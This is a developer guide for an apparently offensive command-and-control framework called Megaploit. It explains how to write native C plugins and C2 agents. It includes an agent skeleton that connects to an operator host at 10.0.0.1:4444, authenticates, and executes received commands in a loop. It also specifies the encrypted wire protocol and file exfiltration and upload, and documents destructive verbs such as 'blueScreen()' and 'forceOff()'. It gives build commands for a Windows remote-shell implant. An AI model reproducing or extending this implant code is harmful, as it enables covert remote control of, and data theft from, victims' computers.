# C Plugin Development Guide

This guide covers everything needed to extend Megaploit with C or C++ code.
There are two distinct roles a C/C++ program can play:

| Role | What it does | Entry point |
|------|-------------|-------------|
| **Native operator tool** | Runs on the operator machine; receives CLI args via `argv`, prints to stdout | `.toml` with `kind = "native"` |
| **C2 agent** | Runs on the target; speaks the full Megaploit wire protocol and accepts operator commands | The C-remote-shell (`C-remote-shell/`) |

Both roles share the same wire-protocol constants defined in
[`plugins/native_sdk/megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h).

---

## Contents

1. [Native operator tool](#1-native-operator-tool)
2. [Wire protocol reference](#2-wire-protocol-reference)
3. [C2 agent implementation](#3-c2-agent-implementation)
4. [C-remote-shell as the reference agent](#4-c-remote-shell-as-the-reference-agent)
5. [C2 compliance probe](#5-c2-compliance-probe)
6. [megaploit_protocol.h API](#6-megaploit_protocolh-api)
7. [Common pitfalls](#7-common-pitfalls)
8. [Compiler requirements](#8-compiler-requirements)

---

## 1. Native Operator Tool

A native plugin is a regular C or C++ program. The Megaploit runner compiles
it on demand and invokes it with expanded CLI args as `argv[1..N]`. Stdout and
stderr are captured and streamed back to the operator console. It has nothing
to do with the C2 socket — it is just a local tool.

### 1.1 Minimal example

**`plugins/mytools/syscheck.c`**

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: syscheck <hostname>\n");
        return 1;
    }
    printf("[*] Checking: %s\n", argv[1]);
    /* ... your logic ... */
    printf("[+] Done.\n");
    return 0;
}
```

**`plugins/mytools/mytools.toml`**

```toml
[plugin]
name        = "mytools"
version     = "1.0.0"
author      = "YourName"
description = "Example native C tool"

[[command]]
name           = "syscheck"
kind           = "native"
description    = "Check a host from the operator machine"
usage          = "syscheck <hostname>"
source_file    = "plugins/mytools/syscheck.c"
compiler_flags = "-O2"
min_args       = 1
max_args       = 1
timeout        = 30
output_format  = "raw"
```

Drop both files in place and run `plugins reload` (or restart Megaploit).
The runner compiles `syscheck.c` on first use and caches the binary next to
the source. It recompiles automatically when the source file is newer than
the binary — same logic as `make`.

### 1.2 Plugin descriptor fields

All fields for `kind = "native"` commands:

| Field | Type | Default | Description |
|-------|------|---------|-------------|
| `name` | string | required | Operator-facing command name (no spaces) |
| `kind` | string | required | Must be `"native"` |
| `description` | string | `""` | One-line description shown in `help` |
| `usage` | string | command name | Usage hint shown in `help` |
| `source_file` | string | required | Path to `.c` or `.cpp` source file |
| `compiler_flags` | string | `""` | Extra flags passed verbatim to the compiler |
| `min_args` | int | `0` | Minimum CLI args required |
| `max_args` | int | `-1` (unlimited) | Maximum CLI args accepted |
| `timeout` | int | `0` (none) | Seconds before the process is killed |
| `dangerous` | bool | `false` | Require `YES` confirmation before running |
| `output_format` | string | `"raw"` | `"raw"` / `"json"` / `"table"` / `"csv"` |
| `env_vars` | table | `{}` | Extra environment variables injected at runtime |
| `retry` | int | `0` | Retry count on non-zero exit |
| `notes` | string | `""` | Long-form operator notes shown in `help <cmd>` |
| `tags` | array | `[]` | Search tags for `plugins search` |

### 1.3 Placeholders

The following placeholders are expanded inside `compiler_flags` and the
`env_vars` values at runtime:

| Placeholder | Value |
|-------------|-------|
| `{lhost}` | Operator LHOST setting |
| `{port}` | Operator PORT setting |
| `{session_ip}` | Active session IP |
| `{session_id}` | Active session numeric ID |
| `{session_tag}` | Operator tag for the session |
| `{session_os}` | Session OS name |
| `{session_hostname}` | Session hostname |
| `{session_username}` | Session username |
| `{arg0}` … `{argN}` | Positional CLI args |
| `{joined_args}` | All args joined with spaces |
| `{key:-default}` | Use `default` when `key` is empty |

Args are passed to the compiled binary as `argv[1..N]` — you do not need to
handle placeholder expansion in your C code.

### 1.4 Compiler selection

The runner tries compilers in this order:

- `.c` source: `gcc` → `clang` → `cc`
- `.cpp` source: `g++` → `clang++` → `c++`

The first one found on `PATH` is used. Override explicitly with
`compiler_flags = "-std=c11 -O2"` etc.

### 1.5 Binary caching

The cached binary path is derived from an 8-character SHA-256 digest of the
absolute source path, stored alongside the source:

```
plugins/mytools/syscheck_a1b2c3d4          (Linux/macOS)
plugins/mytools/syscheck_a1b2c3d4.exe      (Windows)
```

This prevents collisions between plugins with identically-named source files.
The binary is recompiled automatically when `mtime(source) > mtime(binary)`.

### 1.6 Output formats

Set `output_format` to control how stdout is rendered:

| Value | Behaviour |
|-------|-----------|
| `"raw"` | Print as-is (default) |
| `"json"` | Pretty-print JSON parsed from stdout |
| `"pretty_json"` | Same as `json` but with sorted keys |
| `"table"` | Render JSON list-of-dicts or list-of-lists as an ASCII table |
| `"csv"` | Render JSON list-of-lists as CSV |

For `"table"` and `"csv"`, your C program should print valid JSON to stdout.

---

## 2. Wire Protocol Reference

Every message between the Megaploit server and an agent (Python, Go, C, or
any other language) follows this exact layout. Violating any rule causes the
Python server to silently reject the client.

### 2.1 Message framing

```
+------------------+---------------------------+
|  4 bytes         |  N bytes                  |
|  uint32 big-end  |  payload                  |
|  (total length)  |  (see below)              |
+------------------+---------------------------+
```

The 4-byte header is a **big-endian unsigned 32-bit integer** containing the
number of bytes that follow. This matches Python's `struct.pack("!I", N)`.

### 2.2 Plaintext payload (v1 / unencrypted)

```
+------------------+---------------------------+
|  8 bytes         |  data bytes               |
|  uint64 big-end  |  JSON-encoded string      |
|  sequence number |                           |
+------------------+---------------------------+
```

The first 8 bytes of every payload are a **big-endian unsigned 64-bit
monotonic sequence number**, matching Python's `struct.pack("!Q", seq)`.

The data bytes that follow are a **JSON-encoded string** — not a JSON object
or array, but the JSON representation of a plain string value. For example:

```
"ls -la"        (a command the server sends to the agent)
"[+] result"    (a response the agent sends back)
```

In C, produce this with `snprintf(buf, size, "\"%s\"", text)`.

### 2.3 Encrypted payload (v2, AES-256-GCM)

When v2 is active the entire plaintext block (seq + data) is encrypted:

```
+------------------+----------------------------+------------------+
|  12 bytes        |  N bytes                   |  16 bytes        |
|  random nonce    |  AES-GCM ciphertext        |  auth tag        |
+------------------+----------------------------+------------------+
```

The nonce is random for every message. The auth tag is **appended after**
the ciphertext — not prepended. Key length is always 32 bytes (AES-256).

### 2.4 Connection handshake sequence

Every connection follows this exact sequence after TCP connect:

```
 Server                          Agent
   |                               |
   |--- 16 random bytes (nonce) -->|   (HMAC challenge)
   |<-- HMAC-SHA256(key, nonce) ---|   (32 bytes)
   |                               |
   |--- 1 byte: 0x4D or 0x00 ----->|   (version: 'M'=v2, 0x00=v1)
   |<-- same byte echo ------------|
   |                               |
   |=== encrypted C2 channel =====>|   (if v2)
```

Step 1 mirrors [`megaploit/core/crypto.py` `agent_authenticate()`](../megaploit/core/crypto.py).  
Step 2 mirrors [`megaploit/core/protocol.py` `handshake_agent()`](../megaploit/core/protocol.py).

### 2.5 Replay protection

Each side maintains an independent monotonic 64-bit sequence counter:

- **Send**: increment before every message, starting at 1.
- **Receive**: initialise to -1 (meaning "nothing received yet"). Reject any
  message whose sequence number is not strictly greater than the last accepted
  value. This mirrors `_ConnState.check_recv_seq()` in `protocol.py`.

### 2.6 Protocol constants

| Constant | Value | Description |
|----------|-------|-------------|
| `MP_HDR_LEN` | `4` | Outer length prefix (bytes) |
| `MP_SEQ_LEN` | `8` | Sequence number (bytes) |
| `MP_NONCE_LEN` | `12` | AES-GCM nonce (bytes) |
| `MP_TAG_LEN` | `16` | AES-GCM auth tag (bytes) |
| `MP_KEY_LEN` | `32` | Shared secret / AES-256 key (bytes) |
| `MP_V2_MAGIC` | `0x4D` | Version byte for v2 encrypted protocol |
| `MP_MAX_MSG` | `256 MiB` | Per-frame allocation ceiling — matches `MAX_PLUGIN_MSG_SIZE` in `config.py` |
| `TLS_BUF_RECORD` | `16384` | RFC 5246 §6.2.1 max TLS record size |
| `TLS_BUF_SERVER_FLIGHT` | `8192` | Coalesced TLS server handshake flight |
| `TLS_BUF_CLIENT_HELLO` | `1024` | ClientHello with extensions |
| `C2_APP_BUF` | `65536` | Post-handshake C2 app buffer — matches `BUFFER_SIZE` in `config.py` |

---

## 3. C2 Agent Implementation

A C2 agent is a client that connects to the Megaploit server, authenticates,
and enters a command loop. Use `megaploit_protocol.h` for the framing layer.

### 3.1 Minimal agent skeleton (C, plaintext)

```c
#define MEGAPLOIT_USE_OPENSSL   /* remove for plaintext only */
#include "megaploit_protocol.h"
#include <openssl/hmac.h>

static int connect_to_c2(const char *host, int port);  /* your TCP code */

int main(void) {
    const uint8_t key[32] = { /* your 32-byte shared secret */ };
    int fd = connect_to_c2("10.0.0.1", 4444);

    /* Step 1: HMAC-SHA256 challenge/response */
    uint8_t challenge[16], response[32];
    mp_recv_exactly(fd, challenge, 16);
    HMAC(EVP_sha256(), key, 32, challenge, 16, response, NULL);
    send(fd, response, 32, 0);

    /* Step 2: Protocol version handshake */
    uint8_t ver;
    mp_recv_exactly(fd, &ver, 1);
    send(fd, &ver, 1, 0);   /* echo back exactly as received */
    int use_v2 = (ver == MP_V2_MAGIC);

    /* Step 3: Initialise connection state */
    mp_conn_t conn;
    mp_init(&conn, fd, use_v2, key);

    /* Step 4: Command loop */
    while (1) {
        char *cmd = NULL;
        if (mp_recv_msg(&conn, &cmd) != MP_OK) break;

        /* Execute cmd and produce output */
        char output[4096];
        run_command(cmd, output, sizeof(output));
        free(cmd);

        /* Response: JSON string (quoted, internal quotes escaped) */
        char response_json[sizeof(output) + 4];
        snprintf(response_json, sizeof(response_json), "\"%s\"", output);
        if (mp_send_msg(&conn, response_json) != MP_OK) break;
    }

    MP_CLOSE(fd);
    return 0;
}
```

### 3.2 TLS wrapping (recommended)

The server expects TLS when started with `--cert`/`--key`. For Windows agents
use SChannel (see the C-remote-shell reference implementation). For Linux/macOS
agents use OpenSSL:

```c
#include <openssl/ssl.h>
/* Create SSL_CTX with TLS_client_method(), disable old protocols,
 * set SSL_OP_NO_RENEGOTIATION, then SSL_connect().
 * Use SSL_read/SSL_write instead of recv/send. */
```

Buffer sizing for TLS:

```c
uint8_t record_buf[TLS_BUF_RECORD];         /* 16 384 B — RFC 5246 max record */
uint8_t handshake_buf[TLS_BUF_SERVER_FLIGHT]; /* 8 192 B — server hello flight */
uint8_t client_hello[TLS_BUF_CLIENT_HELLO]; /*  1 024 B — ClientHello         */
```

### 3.3 JSON encoding rules

The server's `recv_msg()` calls `json.loads()` on the payload. Your response
**must** be a JSON string literal:

```c
/* Correct */
mp_send_msg(&conn, "\"hello world\"");    /* JSON string */

/* Wrong — server will raise json.JSONDecodeError and drop the message */
mp_send_msg(&conn, "hello world");        /* raw text, not JSON */
mp_send_msg(&conn, "{\"key\":\"val\"}");  /* JSON object, not string */
```

To produce a safe JSON string from C output, escape backslashes and
double-quotes:

```c
static void json_quote(const char *in, char *out, size_t cap) {
    size_t i = 0, o = 0;
    out[o++] = '"';
    while (in[i] && o + 4 < cap) {
        if (in[i] == '"' || in[i] == '\\')
            out[o++] = '\\';
        out[o++] = in[i++];
    }
    out[o++] = '"';
    out[o] = '\0';
}
```

### 3.4 File transfer protocol

The server sends `"download <path>"` or `"upload <name>"` as the command
string. The expected exchange mirrors `megaploit/agent/handlers.py`:

**Download (agent → server)**
```
server sends:   "download /path/to/file"
agent replies:  "FILE_OK"          (if file exists)  -- or error string
agent sends:    <framed file bytes>                   -- same framing, no JSON
```

**Upload (server → agent)**
```
server sends:   "upload filename.bin"
server sends:   <framed file bytes>
agent replies:  "[+] Received: filename.bin"
```

File frames use the same `[uint32-BE length][uint64-BE seq][raw bytes]` layout
as message frames — the only difference is that the bytes after the seq prefix
are raw binary, not JSON.

---

## 4. C-remote-shell as the Reference Agent

The complete, production-quality C2 agent is in [`C-remote-shell/`](../C-remote-shell/).
Read it before writing your own agent — every protocol rule is implemented
exactly as the Python server expects.

### 4.1 Key files to study

| File | What to learn from it |
|------|-----------------------|
| [`tls/tls_client.c`](../C-remote-shell/tls/tls_client.c) | Full SChannel TLS 1.2/1.3 + BCrypt AES-GCM + HMAC-SHA256 |
| [`tls/tls_client.h`](../C-remote-shell/tls/tls_client.h) | `TLS_CONTEXT` struct, the 4-function public API |
| [`client/main.c`](../C-remote-shell/client/main.c) | WinMain reconnect loop, key loading, `tls_connect()` sequence |
| [`client/shell.c`](../C-remote-shell/client/shell.c) | `strncmp()` verb dispatch, `_popen()` fallback, file transfer |
| [`client/config.h`](../C-remote-shell/client/config.h) | All tuneable constants in one place |

### 4.2 The four security layers (in order)

Every connection goes through all four layers inside `tls_connect()` before
any shell traffic flows:

```
TCP socket
  └── Layer 1: SChannel TLS 1.2/1.3
        SP_PROT_TLS1_2_CLIENT | SP_PROT_TLS1_3_CLIENT
        SCH_USE_STRONG_CRYPTO  (AEAD-only cipher suites)
        ISC_REQ_NO_RENEGOTIATION
        SCH_CRED_MANUAL_CRED_VALIDATION (cert check off — C2 is self-signed)
        |
        └── Layer 2: HMAC-SHA256 challenge/response
              server -> 16-byte nonce
              client -> HMAC-SHA256(key, nonce) = 32 bytes
              |
              └── Layer 3: Protocol v2 negotiation
                    server -> 0x4D
                    client -> 0x4D (echo)
                    |
                    └── Layer 4: AES-256-GCM framed messages
                          [uint32-BE len][nonce(12)][ct+tag(16)]
                          [uint64-BE seq][plaintext]
                          monotonic seq, replay protection
```

### 4.3 Verb dispatch pattern

The C client uses `strncmp()` for all command matching. This pattern is
**the source of truth** for `c_probe` verb extraction:

```c
/* Verb the server sends                strncmp match           handler */
if (cbCmd >= 7  && strncmp("sysinfo",  cmd, 7)  == 0) { _handle_sysinfo(pTls);  continue; }
if (cbCmd >= 3  && strncmp("cd ",      cmd, 3)  == 0) { _handle_cd(pTls, ...);  continue; }
if (cbCmd >= 10 && strncmp("forceOff()",cmd,10) == 0) { /* NT power-off */       return;   }
/* ... */
/* Shell fallback — covers everything else */
_shell_exec(pTls, cmd);
```

See [`client/shell.c`](../C-remote-shell/client/shell.c) for the complete table.

---

## 5. C2 Compliance Probe

Before the payload builder compiles the C-remote-shell client, it runs
`megaploit/core/c_probe.py` against the source tree to verify the security
standard. You can run it manually against your own agent:

```python
from megaploit.core.c_probe import probe, print_report, extract_verbs, c_exclusive_verbs

# Full 46-signal compliance check (33 required)
result = probe("C-remote-shell")
print_report(result)
# Summary: 33/33 required signals found  (46/46 total)
# Verdict: [+] COMPLIANT

# What commands does the C client handle?
print(extract_verbs("C-remote-shell"))
# -> ['q', 'blueScreen()', 'forceOff()', 'exit', 'sysinfo', ...]

# Which verbs have no Python-agent counterpart?
print(c_exclusive_verbs("C-remote-shell"))
# -> ['blueScreen()', 'forceOff()']
```

### 5.1 Signals checked

The prober checks 46 signals across four layers. The 33 **required** signals
are the ones the `generate_c` build will refuse to skip:

**Layer 1 — SChannel TLS (16 required signals)**

`SP_PROT_TLS1_2_CLIENT`, `SCH_USE_STRONG_CRYPTO`, `SCH_CRED_NO_DEFAULT_CREDS`,
`SCH_CRED_MANUAL_CRED_VALIDATION`, `ISC_REQ_CONFIDENTIALITY`,
`ISC_REQ_SEQUENCE_DETECT`, `ISC_REQ_REPLAY_DETECT`, `ISC_REQ_STREAM`,
`AcquireCredentialsHandle[AW]`, `InitializeSecurityContext[AW]`,
`EncryptMessage`, `DecryptMessage`, `SECBUFFER_TOKEN`,
`SECPKG_ATTR_STREAM_SIZES`, `SCHANNEL_SHUTDOWN`, `grbitEnabledProtocols`

**Layer 2 — HMAC-SHA256 (5 required signals)**

`BCRYPT_ALG_HANDLE_HMAC_FLAG`, `BCRYPT_SHA256_ALGORITHM`, `BCryptCreateHash`,
`BCryptHashData`, `BCryptFinishHash`

**Layer 3 — Protocol v2 (1 required signal)**

`TLS_V2_MAGIC` / `0x4D`

**Layer 4 — AES-256-GCM (11 required signals)**

`BCRYPT_AES_ALGORITHM`, `BCRYPT_CHAIN_MODE_GCM`, `BCryptEncrypt`,
`BCryptDecrypt`, `BCryptGenRandom`,
`BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO` / `BCRYPT_INIT_AUTH_MODE_INFO`,
uint32-BE frame header, uint64-BE sequence number, big-endian helpers,
strict monotonic sequence check (`recvSeq <=` guard)

### 5.2 Auto-registration of C-exclusive verbs

`c_exclusive_verbs()` scans every `.c` file for `strncmp("VERB", ...)` calls
and returns verbs not present in the Python agent. `commands.py` calls this
at import time and registers an operator command for each one.

To add a new C-exclusive command:

```c
/* 1. In client/shell.c — add a dispatch branch: */
if (cbCmd >= 8 && strncmp("reboot()", cmd, 8) == 0) {
    _handle_reboot(pTls);
    return;
}
```

```
# 2. Restart the Megaploit server.
#    "reboot" will appear in `help` automatically — no Python changes needed.
```

---

## 6. `megaploit_protocol.h` API

The single-header library lives at
[`plugins/native_sdk/megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h).
Include it in any C/C++ program that needs to speak the wire protocol.

### 6.1 Connection state

```c
mp_conn_t c;
mp_init(&c, fd, use_v2, key);   /* key may be NULL for plaintext */
```

| Field | Type | Description |
|-------|------|-------------|
| `fd` | `mp_fd_t` | Socket file descriptor (SOCKET on Windows, int on POSIX) |
| `encrypted` | `int` | 1 = AES-GCM active, 0 = plaintext |
| `key[32]` | `uint8_t` | Shared secret (zeroed for plaintext) |
| `send_seq` | `uint64_t` | Outgoing monotonic counter (starts at 0, incremented before each send) |
| `recv_seq` | `int64_t` | Last accepted incoming seq (-1 = nothing received yet) |

### 6.2 Core functions

```c
/* Initialise a connection state struct */
void mp_init(mp_conn_t *c, mp_fd_t fd, int encrypted, const uint8_t *key);

/* Send a JSON-encoded string as one framed message */
int mp_send_msg(mp_conn_t *c, const char *json_str);

/* Receive one framed message; *out must be free()'d by caller */
int mp_recv_msg(mp_conn_t *c, char **out);

/* Low-level: send/receive one raw frame (no seq/encrypt wrapping) */
int mp_send_frame(mp_conn_t *c, const uint8_t *payload, size_t len);
int mp_recv_frame(mp_conn_t *c, uint8_t **out, size_t *out_len);

/* Exact-size receive/send helpers */
int mp_recv_exactly(mp_fd_t fd, uint8_t *buf, size_t n);
int mp_send_all    (mp_fd_t fd, const uint8_t *buf, size_t n);

/* Big-endian helpers */
uint32_t mp_be32(const uint8_t *b);
uint64_t mp_be64(const uint8_t *b);
void     mp_put_be32(uint8_t *b, uint32_t v);
void     mp_put_be64(uint8_t *b, uint64_t v);
```

### 6.3 Error codes

| Code | Value | Meaning |
|------|-------|---------|
| `MP_OK` | `0` | Success |
| `MP_ERR_IO` | `-1` | Socket read/write failed or EOF |
| `MP_ERR_OOM` | `-2` | `malloc` returned NULL |
| `MP_ERR_REPLAY` | `-3` | Sequence number out of order |
| `MP_ERR_CRYPTO` | `-4` | AES-GCM authentication failure |
| `MP_ERR_TOOBIG` | `-5` | Frame header exceeds `MP_MAX_MSG` |

### 6.4 AES-256-GCM (OpenSSL)

Define `MEGAPLOIT_USE_OPENSSL` before including the header to enable the
OpenSSL AES-GCM helpers:

```c
#define MEGAPLOIT_USE_OPENSSL
#include "megaploit_protocol.h"

/* Encrypt: out must be plain_len + MP_TAG_LEN bytes */
int mp_gcm_encrypt(const uint8_t *key, const uint8_t *nonce,
                   const uint8_t *plain, size_t plain_len,
                   uint8_t *out, size_t *out_len);

/* Decrypt: ct_tag = ciphertext || 16-byte tag */
int mp_gcm_decrypt(const uint8_t *key, const uint8_t *nonce,
                   const uint8_t *ct_tag, size_t ct_tag_len,
                   uint8_t *out, size_t *out_len);
```

Link with `-lssl -lcrypto` (Linux/macOS) or the appropriate OpenSSL import
libraries on Windows.

### 6.5 Windows (SChannel) alternative

For Windows-native TLS without OpenSSL, use the C-remote-shell TLS layer
(`C-remote-shell/tls/tls_client.h`) instead. It implements the same four
security layers using SChannel + BCrypt — no third-party dependencies.

---

## 7. Common Pitfalls

These are the exact mistakes that cause the Python server to silently drop
or reject your client:

| Mistake | Correct behaviour |
|---------|------------------|
| Sending raw text without the 8-byte sequence prefix | Prepend `uint64-BE seq` to every payload before encrypting / sending |
| JSON object/array instead of JSON string | Every payload must be a JSON **string**: `"\"ls -la\""`, not `"{\"cmd\":\"ls\"}"` |
| Little-endian length or sequence | Both the 4-byte length prefix and 8-byte seq must be **big-endian** |
| Reusing a sequence number | Increment `send_seq` before every send; server rejects `seq <= last_seen` |
| AES-GCM nonce after the ciphertext | Layout: `nonce(12) || ciphertext || tag(16)` — nonce comes **first** |
| Missing 16-byte GCM auth tag | The tag is appended after the ciphertext; its absence fails `DecryptFinal` |
| Echoing a different version byte | Echo back **exactly** the 1-byte version the server sent |
| HMAC over the wrong data | Compute `HMAC-SHA256(key, challenge)` — key first, challenge second |
| Allocating less than 16 384 bytes for a TLS receive buffer | A single TLS record can be up to 16 384 bytes (RFC 5246 §6.2.1) |
| Accepting frames larger than 256 MiB | Reject any frame header > `MP_MAX_MSG` before allocating |

---

## 8. Compiler Requirements

### Native plugins (`kind = "native"`)

| Platform | Compiler | Install |
|----------|----------|---------|
| Linux / macOS | `gcc` or `clang` | `apt install gcc` / `brew install gcc` |
| Windows | `gcc` via MinGW | `winget install msys2` → `pacman -S mingw-w64-x86_64-gcc` |

The runner auto-detects the first available compiler. No configuration needed.

### C-remote-shell client (Windows EXE)

| Compiler | How to get it |
|----------|---------------|
| MSVC `cl.exe` | Install Visual Studio; open "Developer Command Prompt for VS" |
| MinGW `x86_64-w64-mingw32-gcc` | Linux/macOS: `apt install mingw-w64` |

Required linker libraries:
`Secur32.lib  Crypt32.lib  ws2_32.lib  bcrypt.lib  Advapi32.lib  User32.lib`

Build via the C2 console:

```
megaploit> generate_c 10.0.0.1 4444
```

Or manually with the Makefile:

```bat
cd C-remote-shell
make C2_IP=10.0.0.1 C2_PORT=4444
```

---

*See also:*
- [`plugins/native_sdk/megaploit_protocol.h`](../plugins/native_sdk/megaploit_protocol.h) — single-header protocol library
- [`plugins/native_sdk/example_plugin.cpp`](../plugins/native_sdk/example_plugin.cpp) — working native plugin example
- [`plugins/native_sdk/example_native.toml`](../plugins/native_sdk/example_native.toml) — plugin descriptor for the example
- [`C-remote-shell/README.md`](../C-remote-shell/README.md) — C-remote-shell integration guide
- [`C-remote-shell/CHANGELOG.md`](../C-remote-shell/CHANGELOG.md) — bug-fix log and developer guide
- [`megaploit/core/c_probe.py`](../megaploit/core/c_probe.py) — C2 compliance prober
- [`megaploit/core/protocol.py`](../megaploit/core/protocol.py) — authoritative Python protocol implementation
- [`megaploit/core/crypto.py`](../megaploit/core/crypto.py) — HMAC-SHA256 authentication
